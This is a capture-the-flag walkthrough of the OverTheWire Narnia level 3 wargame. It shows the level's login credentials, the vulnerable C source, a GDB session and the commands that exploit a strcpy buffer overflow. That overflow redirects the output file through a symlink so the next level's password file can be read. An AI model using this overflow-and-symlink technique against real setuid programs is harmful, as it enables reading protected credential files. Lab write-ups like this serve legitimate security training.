## Login 

` SSH : ssh narnia3@narnia.labs.overthewire.org -p 2226 `
` Pass : 2xszzNl6uG `

## Solution

First, let’s try to execute the program…

```
$ ssh narnia3@narnia.labs.overthewire.org -p 2226

narnia3@narnia:~$ cd /narnia/
narnia3@narnia:/narnia$ ./narnia3
usage, ./narnia3 file, will send contents of file 2 /dev/null
```

So, I guess we need to enter a file as argument…
### Source Code

Here is the source :

```
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

So, the source looks complex but it’s not. In fact there is no boundary check on the input file. So, if we overflow **ifile**, we could overwrite the **ofile** which is statically intialized with **/dev/null**.

Let’s check the value of **ofile** with GDB, to do that we need to place a breakpoint here :

```
   0x0804855f <+84>:	add    esp,0x8
   0x08048562 <+87>:	push   0x2
   0x08048564 <+89>:	lea    eax,[ebp-0x18]
   0x08048567 <+92>:	push   eax
   0x08048568 <+93>:	call   0x80483c0 <open@plt> ; Right Here
```

As **ofile** pointer will be place in **EAX** we can see its value :

```
$ gdb narnia3

(gdb) break *main+93
Breakpoint 1 at 0x8048568
(gdb) run test
Starting program: /narnia/narnia3 test

Breakpoint 1, 0x08048568 in main ()
(gdb) x/s $eax
0xffffd690:	"/dev/null"
```

Okay, now we restart the program with 32 bytes of garbage and add a new path…

```
(gdb) run /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/whatever
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia3 /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/whatever

Breakpoint 1, 0x08048568 in main ()
(gdb) x/s $eax
0xffffd660:	"/whatever"
```

Awesome! Now, we can write where we want. As **/tmp/** is read/write/exec we can create something like **/tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp** and create a _symbolic link_ of **/etc/narnia_pass/narnia4** to **/tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax** file so the program can write the password into our file.

Here are the steps :

```
narnia3@narnia:/narnia$ mkdir -p /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp
narnia3@narnia:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
narnia3@narnia:/narnia$ touch /tmp/ax
narnia3@narnia:/narnia$ chmod 777 /tmp/ax
narnia3@narnia:/narnia$ ./narnia3 /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax
copied contents of /tmp/FOOBARFOOBARFOOBARFOOBARFOO/tmp/ax to a safer place... (/tmp/ax)
narnia3@narnia:/narnia$ cat /tmp/ax
iqNWNk173q
```

It was a fun one :)